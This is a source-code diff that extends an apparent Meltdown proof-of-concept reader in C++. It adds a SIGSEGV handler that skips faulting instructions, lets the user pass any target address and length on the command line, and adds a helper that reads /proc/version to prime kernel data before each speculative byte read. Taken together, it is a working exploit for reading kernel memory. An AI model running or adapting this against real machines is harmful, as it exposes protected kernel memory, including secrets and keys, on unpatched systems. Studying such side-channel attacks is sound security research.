@@ -2,6 +2,11 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <stdint.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 #include "meltreader.hpp"
 
 static uint32_t __inline cpuid(uint32_t r0, uint32_t sub, uint32_t & a, uint32_t &b, uint32_t & c, uint32_t &d)
@@ -25,7 +30,32 @@ static bool check_tsx()
 	return false;
 }
 
-int main()
+void sigsegv(int sig, siginfo_t *siginfo, void *context)
+{
+	ucontext_t *ucontext = (ucontext_t*)context;
+	ucontext->uc_mcontext.gregs[REG_RIP] += 20;
+}
+
+int set_signal(void)
+{
+	struct sigaction act = {0};
+	act.sa_sigaction = sigsegv;
+	act.sa_flags = SA_SIGINFO;
+	return sigaction(SIGSEGV, &act, NULL);
+}
+
+static void load_kernel_mem(void)
+{
+	int f = open("/proc/version", O_RDONLY);
+	if (f>0)
+	{
+		char buf[100];
+		read(f, buf, sizeof(buf));
+		close(f);
+	}
+}
+
+int main(int argc, char ** argv)
 {
 	const char * testptr = "Hello, it's working.";
 	uintptr_t addr = (uintptr_t)testptr;
@@ -34,16 +64,24 @@ int main()
 	{
 		printf("CPU has tsx! canbe faster.\n");
 	}
+	set_signal();
 	
 	CMeltReader rdr;
 	
 	uint32_t len = 32;
+
+	if (argc == 3)
+	{
+		addr = strtoull(argv[1], 0, 16);
+		len = strtoull(argv[2], 0, 0);
+	}
+
 	char * buf = (char*)malloc(len);
 	memset(buf, 0xff, len);
 	uint32_t failed = 0;
 	for (uint32_t i=0; i<len; ++i)
 	{
-		int v = rdr.read_byte(addr+i);
+		int v = rdr.read_byte(addr+i, load_kernel_mem);
 		if (v == -1) ++ failed;
 		buf[i] = (char)v;
 	}
